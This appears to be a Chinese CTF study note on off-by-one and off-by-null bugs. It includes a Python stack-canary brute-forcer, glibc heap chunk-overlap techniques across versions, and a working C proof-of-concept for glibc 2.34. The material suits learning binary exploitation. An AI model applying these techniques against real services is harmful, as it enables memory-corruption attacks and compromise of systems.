## 简介

> 差一错误（英语：Off-by-one error，缩写OBOE）是在计数时由于边界条件判断失误导致结果多了一或少了一的错误，通常指计算机编程中循环多了一次或者少了一次的程序错误，属于逻辑错误的一种。比如，程序员在循环中进行比较的时候，本该使用“小于等于”，但却使用了“小于”，或者是程序员没有考虑到一个序列是从0而不是1开始（许多程序语言的数组下标都是这样）。

主要是打堆上的 off by one，栈上的也有，但是比较老套、简单。

> off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括
> 
> - 使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。
> - 字符串操作不合适



## 栈上的 off by one

### 泄漏 canary

canary 在设计时，处于安全考虑，为了不被输出函数（如 `printf`）等打印出来，设计为 15 字节的随机数和 1 字节的 `\x00` 用于截断。因此栈上的 off by one 如果可以覆盖掉 canary 最后一字节，就可以利用原来的 printf 函数打印出 canary 的值。

### 爆破 canary

对于canary，虽然每次进程重启后canary会不同，但是同一个进程中的不同线程的canary却是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存

最低位为 0x00,之后逐位爆破，因此32位的话要循环 3 次、64位的则需要循环 7 次。

要求是程序里要有 fork 函数，exp:

```python
print("[+] Brute forcing stack canary ")

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         # print("\t[+] Byte found 0x%02x" % i)
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print(canary)
```

## 堆上的 off by one

常见的堆上的 off by one 的出题方式主要有以下几种：

1. 在遇到用 `strcpy` 函数将某个变量或常量的值写入堆内时，复制遇到结束符 `\x00` 停止，并且在复制结束的时候在结尾写入一个 `\x00`。那么在读入的数据和堆块的最大存储内容大小相等的时候，就会向外溢出一个字节的 `\x00`，从而形成 off-by-one。
2. 在向堆内循环写入的时候，没有控制好循环次数而导致多写入一字节的内容，导致 off-by-one.
3. 在CTF中出题人故意写出的 off-by-one 漏洞。比如：`size+1 <= max_content_size`，这种只能尽量仔细地去测菜单题里的每一个功能，找到 offbyone 的溢出点，然后实现利用。

假如限制 off-by-one 的溢出字节是 `\x00`，那就是 off-by-null，重点介绍一下 off-by-null 的攻击方式。

### off by null

这个漏洞的攻击面很广泛，主要攻击目的是造成堆块重叠（overlap），从 2.23 - 2.40 都可以打，不过高版本（2.29）之后加入了更多的检查保护，所以利用方法会更复杂一点。


#### < 2.29

先说一下 glibc2.23，最经典的构造方式就是“三明治构造”：

- 构造任意大小的三个 chunk，设为 A、B、C，这里主要是注意不要让 A、C 这两个 chunk 可以被放进 fastbin 里，不然后面 free 掉后无法参与 unlink
- 保证 C 的 size 字段的最低 12 位为 `0x?01`，这是方便后续 off by null 利用
- 释放 A
- 填满 B，要求能写 C 的 prev_size 字段为 A 和 B 的 size 之和，同时触发 off by null，将 C 的 prev_inuse 设置为 0
- 释放 C

这样就可以直接构造出 chunk overlap，可以 UAF。

注意点：

- 一定要先释放 A 再释放 C，unlink 的时候会索引 `fd` `bk` 构成的循环链表，程序会 dump 在访问 `rax + 0x18` 时；

另一个构造方式应用在无法修改 prev_size 时的情况，主要思想是利用一个 chunk 被 free 后会在后一个 chunk 的 prev_size 写前者的 chunk 大小，从而实现伪造 prev_size。流程是：

- 构造任意 4 个 chunk，设为 A B C D，A 用来做溢出，B 需要大一点便于切割且 B 的 size 不能是 `0x?00`，D 用来隔离 top chunk
- free(B)，C 的 prevsize 会被修改为 B 的 size，B 进了 UB
- 填满 A，同时 off by null 修改 B 的 size 字段的最低一字节为 \x00
- 申请 4 个小 chunk a b c d，大小大小，b d 用来隔离
- 先后释放 a 和 C，这时也是一个三明治结构，`a|c|C`

然后是 2.27 之后出现的 tcache，注意提前填满别让 free 掉的 chunk 进 tcache bin 就可以

#### > 2.29

高版本后加了这样一个检测：

```c
if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
```

利用思路基本上都变成了在 chunk 中构造 fake_chunk，这里就区分为可泄漏堆地址和不可泄漏堆地址了。


##### 可泄漏堆地址

参考三明治结构，在 A 里伪造一个 fake chunk (freed)，然后释放 C，完成后向合并，中间的 B 可以用来 UAF。

堆地址用在构造 fake chunk 时，需要设置 fake chunk 的 fd 和 bk 为 `&fake_chunk`（参考注意点）。

**泄漏方法：**

1. 利用 tcache：低版本（没有加入异或校验前）需要两个 tcache 然后 leak 出来得到堆地址，高版本 tcache chunk fd 字段就是 `堆地址 << 12`；
2. 利用 fastbin：类似 tcache
3. 利用 unsortbin：当 unsorted bin 链上有两个堆块的时候，其中一个堆块的 fd 会指向另一个堆块，我们可以直接 leak 得到，并计算出堆基址。
4. 利用 largebin: 如果堆块在 largebin 中，他的 fd_nextsize 和 bk_nextsize 都会指向堆块地址，可以泄露出。

##### 不可泄漏堆地址

比较麻烦，有两种办法爆破的和不爆破的，他俩的根本区别在于利用时合并的方向，爆破法总是后向合并（前一个块和当前块合并，也就是向低地址合并），非爆破法则是前向合并（当前块和后一个块合并，也就是向高地址合并）

大致利用方式如下：

* 先后释放`FD`、`chunk2`、`BK2`，在`chunk2`中踩出`fd`和`bk`指针
* 释放`chunk1`，使得`chunk1`和`chunk2`合并并重新分配二者的`size`，让`chunk1`包含之前`chunk2`的`size`和`fd`及`bk`
* 之前的`chunk2`现在称为`fake chunk`。修改`fake chunk`的`size`，恢复`FD`和`BK`
* 先后释放`FD`和`chunk2`到`unsortedbin`，使得`FD's bk = chunk2`。部分修改`FD`的`bk`，使得`FD's bk = fake chunk`
* 恢复`FD`和`chunk2`，现在`fake_chunk -> fd -> bk == fake_chunk`
* 先后释放`chunk2`和`BK2`并释放`BK1`。重新分配合并的`BK`，使得可以部分修改原本`BK2`的`fd`，使得`BK's fd = fake chunk`
* 恢复`BK`和`chunk2`，现在满足`fake_chunk -> bk -> fd == fake_chunk`
* 释放`victim(gap3)`并重新申请回来，写`BK1`的`prev_size`和`prev_inuse`
* 释放`BK1`，导致`fake chunk`、`victim`、`BK1`合并，获得重叠指针


```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void init(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
}

// 基于glibc2.34
// 本POC旨在展示一种更为通用的情况，即回车不会被替换为\x00，这意味着至少倒数第二字节会被覆盖为\x00
int main(){
    init();
    // 先构造堆块如下，注意需要让利用堆块2的地址对齐0x100。
    // 例如在glibc2.34下，tcache_perthread_struct的大小为0x100，利用堆块2的地址刚好为0x??c00
    size_t* gap1 = malloc(0x10); // gap1
    size_t* FD = malloc(0x420); // FD
    size_t* gap2 = malloc(0x90); // gap2
    size_t* chunk1 = malloc(0x470); // 利用堆块1
    size_t* chunk2 = malloc(0x470); // 利用堆块2
    size_t* gap3 = malloc(0x10); // gap3 (victim)
    size_t* BK1 = malloc(0x410); // BK1
    size_t* BK2 = malloc(0x410); // BK2
    size_t* gap4 = malloc(0x10); // gap4

    // 第一步：先后释放FD、利用堆块2、BK到unsortedbin
    // 目的是在利用堆块2中踩出fd和bk指针
    free(FD);
    free(chunk2);
    free(BK2);

    // 第二步：释放利用堆块1，使得两个利用堆块合并，从而重新分配二者的size
    // 会被添加到unsortedbin末尾
    free(chunk1);

    // 第三步：重新分配两个利用堆块的size，使得可以操纵之前chunk的size
    // 意味着最开始的chunk2成为了现在的fake chunk
    chunk1 = malloc(0x498);
    chunk2 = malloc(0x458);

    chunk2[-5] = 0x4a1; // fake chunk's size

    // 第四步：恢复FD和BK
    FD = malloc(0x420); // FD
    BK2 = malloc(0x410); // BK

        // 第五步：满足fake_chunk->fd->bk = fake_chunk
    // 先将chunk2和FD_释放到unsortedbin，踩出FD_的bk
    free(FD);
    free(chunk2);
    // 再申请回来，同时部分写其bk指针使其满足fake_chunk->fd->bk = fake_chunk
    FD = malloc(0x420);
    chunk2 = malloc(0x458);
    *((char*)FD + 8) = 0;

        // 第六步：满足fake_chunk->bk->fd = fake_chunk
    // 由于最低覆写倒数第二字节为0，因此需要合并两个BK再重新分配size
    free(chunk2);
    free(BK2);
    free(BK1);

    // 申请回chunk2
    chunk2 = malloc(0x458);

    // 重新分配BK1和BK2的size
    BK1 = malloc(0x4f0);
    BK2 = malloc(0x330);

    // 通过BK1来写之前的BK2的fd
    *((char*)BK1 + 0x420) = 0;

    // 第七步：通过gap3(victim)来off by null同时写prev_size
    free(gap3);
    gap3 = malloc(0x18);
    gap3[2] = 0x4a0; // prev_size
    *((char*)gap3 + 0x18) = 0; 

    // 第八步：释放BK1，触发off by null漏洞，将chunk2、gap3(victim)、BK1合并
    printf("Before free, the fake chunk's size is 0x%lx.\n", chunk2[-5]);
    free(BK1);
    printf("After free, the fake chunk's size has been 0x%lx, proves that the three chunks have been merged.\n", chunk2[-5]);
    assert(chunk2[-5] == 0x9a1);    
}
```

抄的晚秋的。
